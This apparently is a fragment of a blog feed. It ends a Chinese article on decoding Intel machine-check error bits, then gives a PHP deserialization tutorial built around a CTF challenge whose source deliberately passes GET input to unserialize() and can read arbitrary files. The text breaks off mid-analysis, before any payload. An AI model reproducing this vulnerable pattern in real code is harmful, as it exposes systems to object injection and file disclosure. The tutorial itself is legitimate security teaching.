progress。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122150512960.png" alt="image-20210122150512960"></p><ul><li>Bit 0: Restart IP Valid. 表示程序的执行是否可以在被异常中断的指令处重新开始。</li><li>Bit 1: Error IP Valid. 表示被中断的指令是否与MCE错误直接相关。</li><li>Bit 2: Machine Check In Progress. 表示 machine check 正在进行中。</li></ul><h2 id="be00000000800400-的含义"><a href="#be00000000800400-的含义" class="headerlink" title="be00000000800400 的含义"></a>be00000000800400 的含义</h2><p>它来自bank寄存器IA32_MCi_STATUS MSR，(对应struct mce的status字段)。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/MCi_status.png" alt="ia32-mci"></p><p>be00000000800400 的二进制位如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Bit 63: VAL. 表示本寄存器中包含有效的错误码</span><br><span class="line">Bit 61: UC. 表示是无法纠正的MCE</span><br><span class="line">Bit 60: EN. 表示处于允许报告错误的状态</span><br><span class="line">Bit 59: MISCV. 表示MCi_MISC寄存器中含有对该错误的补充信息</span><br><span class="line">Bit 58: ADDRV. 表示MCi_ADDR寄存器含有发生错误的内存地址</span><br><span class="line">Bit 57: PCC. 表示该CPU的上下文状态已被该错误破坏，无法恢复软件代码的运行</span><br><span class="line">Bits [16:31] 包含特定CPU型号相关的扩展错误码. 本例中是0x0080.</span><br><span class="line">Bits [0:15] 包含MCE错误码，该错误码是所有CPU型号通用的，分为两类：simple error codes（简单错误码） 和 compound error codes（复合错误码）</span><br></pre></td></tr></table></figure><p>本例中0x0400表示Internal timer error：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">– Simple Error Codes:</span><br><span class="line">0000 0000 0000 0000 – 没有错误.</span><br><span class="line">0000 0000 0000 0001 – Unclassified. 未分类的错误类型.</span><br><span class="line">0000 0000 0000 0010 – ROM微码校验错</span><br><span class="line">0000 0000 0000 0011 – MCE是由于别的CPU的BINT# 引起的.</span><br><span class="line">0000 0000 0000 0100 – Functional redundancy check (FRC) master&#x2F;slave error.</span><br><span class="line">0000 0000 0000 0101 – Internal parity error.</span><br><span class="line">0000 0100 0000 0000 – Internal timer error.</span><br><span class="line">0000 01xx xxxx xxxx – Internal unclassified error. 至少有一个x等于1</span><br><span class="line"></span><br><span class="line">– Compound Error Codes:</span><br><span class="line">000F 0000 0000 11LL – Generic cache hierarchy errors.</span><br><span class="line">000F 0000 0001 TTLL – TLB errors.</span><br><span class="line">000F 0000 1MMM CCCC – Memory controller errors (Intel-only).</span><br><span class="line">000F 0001 RRRR TTLL – Memory errors in the cache hierarchy.</span><br><span class="line">000F 1PPT RRRR IILL – Bus and interconnect errors.</span><br></pre></td></tr></table></figure><p>下一步，由于Bits [16:31] 是非零值0x0080，包含的是特定CPU型号相关的扩展错误码，我们要参考Intel手册第三卷第16章。首先确定CPU型号，我们需要的是CPU faimily和model，从/proc/cpuinfo中可以找到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># less &#x2F;proc&#x2F;cpuinfo</span><br><span class="line">...</span><br><span class="line">processor       : 3</span><br><span class="line">vendor_id       : GenuineIntel</span><br><span class="line">cpu family      : 6</span><br><span class="line">model           : 26</span><br><span class="line">model name      : Intel(R) Xeon(R) CPU           L5520  @ 2.27GHz</span><br><span class="line">stepping        : 5</span><br><span class="line">cpu MHz         : 2266.700</span><br><span class="line">cache size      : 8192 KB</span><br><span class="line">physical id     : 1</span><br><span class="line">siblings        : 8</span><br><span class="line">core id         : 2</span><br><span class="line">cpu cores       : 4</span><br><span class="line">apicid          : 20</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>根据cpu family/model，即06_1AH，找到Intel手册中对应的章节，但是没找到匹配Internal timer error和0x0080的条目。所以只能到此为止了。</p><p>所以MCE检测的错误为：</p><blockquote><p>CPU 3 发现了无法纠正的MCE，是Internal timer error，被中断的指令与MCE不相关，被中断的程序指令不能恢复运行，CPU的上下文已被MCE破坏</p></blockquote><h1 id="如何禁用MCE"><a href="#如何禁用MCE" class="headerlink" title="如何禁用MCE"></a>如何禁用MCE</h1><p>可以在 /boot/grub/grub.conf 中加入以下内容：mce=off</p><p>还有其它的MCE选项，比如禁用CMCI(Corrected Machine Check Interrupt)，或者禁用MCE日志，等等，例如：<br>mce=off  — Disable machine check<br>mce=no_cmci  — Disable CMCI(Corrected Machine Check Interrupt)</p><p>参见文档：Documentation/x86/x86_64/boot-options.txt</p><p>每个 CPU 都有一个sysfs接口：<br>/sys/devices/system/machinecheck/machinecheckN<br>注：(N = CPU number)</p><p>其中包含的可调参数参见：Documentation/x86/x86_64/machinecheck</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">Intel 64 and IA-32 Architectures Software Developer’s Manual</a></p><p><a href="http://amd-dev.wpengine.netdna-cdn.com/wordpress/media/2012/10/24593_APM_v21.pdf">AMD64 Architecture Programmer’s Manual Volume 2: System Programming</a></p><p><a href="http://linuxperf.com/?p=105">http://linuxperf.com/?p=105</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h1&gt;&lt;p&gt;Intel从奔腾4开始的CPU中增加了一种机制，称为MCA——Machine Check Architecture，它用来检测硬件（这里的M
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="MCA" scheme="http://www.ol4three.com/tags/MCA/"/>
    
      <category term="MCE" scheme="http://www.ol4three.com/tags/MCE/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化学习与实践</title>
    <link href="http://www.ol4three.com/2021/01/22/CTF/Web/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>http://www.ol4three.com/2021/01/22/CTF/Web/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/</id>
    <published>2021-01-22T06:29:13.000Z</published>
    <updated>2021-01-25T02:16:29.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><blockquote><p>反序列化：PHP程序为了保存和转储对象，提供了序列化的方法，PHP序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</p><p>基本上都是围绕这两个函数来展开的，通俗的说反序列化和序列化的意思。</p><p>序列化：将对象转换成字符串。</p><p>反序列化：将序列化后的字符串转换为对象还原。</p><p>这两个关系相当于一正一反。</p></blockquote><h1 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h1><blockquote><p>PHP序列化的函数为serialize。反序列化的函数为unserialize。</p><p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控</p></blockquote><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    private $flag &#x3D; &quot;111&quot;;</span><br><span class="line">    protected $a1 &#x3D; &quot;aaa&quot;;</span><br><span class="line">    public $b2 &#x3D; &quot;bbb&quot;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">    $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">public function get_flag()</span><br><span class="line">&#123;</span><br><span class="line">return $this-&gt;flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    $test &#x3D; new test;</span><br><span class="line">    $test-&gt;set_flag(&#39;ol4three&#39;);</span><br><span class="line">    $data &#x3D; serialize($test);</span><br><span class="line">    echo $data;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>反序列化可以控制类属性，无论是private还是public</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─$ php test.php</span><br><span class="line">O:4:&quot;test&quot;:3:&#123;s:10:&quot;testflag&quot;;s:8:&quot;ol4three&quot;;s:5:&quot;*a1&quot;;s:3:&quot;aaa&quot;;s:2:&quot;b2&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122153805620.png" alt="image-20210122153805620"></p><p>这里说明一下序列化字符串的含义：<br><code>O:4:&quot;test&quot;</code>指Object(对象) 4个字符:test<br><code>:3</code>对象属性个数为3<br>{}中为属性字符数：属性值</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122154217382.png" alt="image-20210122154217382"></p><p><em>注意：如果你是细心的同学，你可能会注意到一个小问题，按照我前面对象名的格式算的话你可能会发现后面的属性名有些另类，你看啊,我代码里面明明写的是<br>flag 属性，序列化以后却变成了 testflag ，而且前面说好的长度也不一样了，testflag<br>明明是8个字符，到你这里却成了10个，除此之外后面的 test 属性也“变异了”，前面多了个（</em>）并且长度也不对，这到底是为什么呢？</p><blockquote><p>这涉及到PHP的属性的访问权限序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，必然也会将属性的权限序列化进去，我们发现我们定义的类的属性有三种 private protected 和 默认的 public(默认属性)，其中</p></blockquote><h3 id="1-Public权限"><a href="#1-Public权限" class="headerlink" title="1.Public权限"></a>1.Public权限</h3><p>Public是几个字符就是几个字符</p><h3 id="2-Private-权限"><a href="#2-Private-权限" class="headerlink" title="2.Private 权限"></a>2.Private 权限</h3><p>该权限是私有权限，也就是说只能 test类使用，于是在序列化的时候必须加入一些标志，所以私有属性序列化为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00类名%00属性名</span><br></pre></td></tr></table></figure><p>查看一下我们的序列化的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╰─$ php test.php &gt; a.txt</span><br><span class="line">╰─$ xxd  a.txt</span><br><span class="line">00000000: 4f3a 343a 2274 6573 7422 3a33 3a7b 733a  O:4:&quot;test&quot;:3:&#123;s:</span><br><span class="line">00000010: 3130 3a22 0074 6573 7400 666c 6167 223b  10:&quot;.test.flag&quot;;</span><br><span class="line">00000020: 733a 383a 226f 6c34 7468 7265 6522 3b73  s:8:&quot;ol4three&quot;;s</span><br><span class="line">00000030: 3a35 3a22 002a 0061 3122 3b73 3a33 3a22  :5:&quot;.*.a1&quot;;s:3:&quot;</span><br><span class="line">00000040: 6161 6122 3b73 3a32 3a22 6232 223b 733a  aaa&quot;;s:2:&quot;b2&quot;;s:</span><br><span class="line">00000050: 333a 2262 6262 223b 7d                   3:&quot;bbb&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122155117222.png" alt="image-20210122155117222"></p><h3 id="3-Protected"><a href="#3-Protected" class="headerlink" title="3.Protected"></a>3.Protected</h3><p>根据上图的结果可以看到Protected的序列化结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00*%00属性名</span><br></pre></td></tr></table></figure><h2 id="编写反序列化"><a href="#编写反序列化" class="headerlink" title="编写反序列化"></a>编写反序列化</h2><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    private $flag &#x3D; &quot;111&quot;;</span><br><span class="line">    protected $a1 &#x3D; &quot;aaa&quot;;</span><br><span class="line">    public $b2 &#x3D; &quot;bbb&quot;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">    $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">public function get_flag()</span><br><span class="line">&#123;</span><br><span class="line">return $this-&gt;flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    $test &#x3D; file_get_contents(&#39;a.txt&#39;);</span><br><span class="line">    $test &#x3D; unserialize($test);</span><br><span class="line">    echo $test-&gt;b2.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo $test-&gt;get_flag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─$ php test1.php</span><br><span class="line">bbb&lt;br&gt;ol4three%</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122155845669.png" alt="image-20210122155845669"></p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><ul><li>__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</li><li>__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</li><li>__toString：当对象被当做一个字符串使用时调用。</li><li>__sleep：序列化对象之前就调用此方法(其返回需要一个数组)。</li><li>__wakeup：反序列化恢复对象之前调用该方法。</li><li>__call：当调用对象中不存在的方法会自动调用该方法。</li><li>__get：在调用私有属性的时候会自动执行。</li><li>__isset( )在不可访问的属性上调用isset( )或empty( )触发。</li><li>__unset( )在不可访问的属性上使用unset( )时触发。</li></ul><h2 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h2><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Caiji&#123;</span><br><span class="line">    public function __construct($ID, $sex, $age)&#123;</span><br><span class="line">        $this-&gt;ID &#x3D; $ID;</span><br><span class="line">        $this-&gt;sex &#x3D; $sex;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;info &#x3D; sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        echo $this-&gt;info . &#39;&lt;br&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * serialize前调用 用于删选需要被序列化存储的成员变量</span><br><span class="line">     * @return array [description]</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        echo __METHOD__ . &#39;&lt;br&gt;&#39;;</span><br><span class="line">        return [&#39;ID&#39;, &#39;sex&#39;, &#39;age&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * unserialize前调用 用于预先准备对象资源</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo __METHOD__ . &#39;&lt;br&gt;&#39;;</span><br><span class="line">        $this-&gt;info &#x3D; sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me &#x3D; new Caiji(&#39;twosmi1e&#39;, 20, &#39;male&#39;);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line">&#x2F;&#x2F;存在__sleep(函数，$info属性不会被存储</span><br><span class="line">$temp &#x3D; serialize($me);</span><br><span class="line">echo $temp . &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$me &#x3D; unserialize($temp);</span><br><span class="line">&#x2F;&#x2F;__wakeup()组装的$info</span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122163525137.png" alt="image-20210122163525137"></p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><blockquote><p>__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj; 应该是显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误</p></blockquote><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Caiji&#123;</span><br><span class="line">    public function __construct($ID, $sex, $age)&#123;</span><br><span class="line">        $this-&gt;ID &#x3D; $ID;</span><br><span class="line">        $this-&gt;sex &#x3D; $sex;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;info &#x3D; sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me &#x3D; new Caiji(&#39;ol4three&#39;, 18, &#39;male&#39;);</span><br><span class="line">echo &#39;__toString:&#39; . $me . &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122164141294.png" alt="image-20210122164141294"></p><h3 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h3><p>实例：</p><p>题目是网鼎杯中青龙组的一道历年真题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op &#x3D; &quot;1&quot;;</span><br><span class="line">        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;</span><br><span class="line">        $content &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>isset判断get传过来的参数有没有数据。然后if判断，这里用到了一个过滤的函数，我们不用管。</p><p>$obj = unserialize($str)；这里使用到了一个反序列化的函数。反序列化GET传过来的参数。</p><pre><code>function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;</code></pre><p>在这里可以看到当对象结束（销毁）的时候会调用这个函数，我们可以看到if 判断op === “2”</p><p>然后调用process();</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">    if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">        $this-&gt;write();</span><br><span class="line">    &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">        $res &#x3D; $this-&gt;read();</span><br><span class="line">        $this-&gt;output($res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span 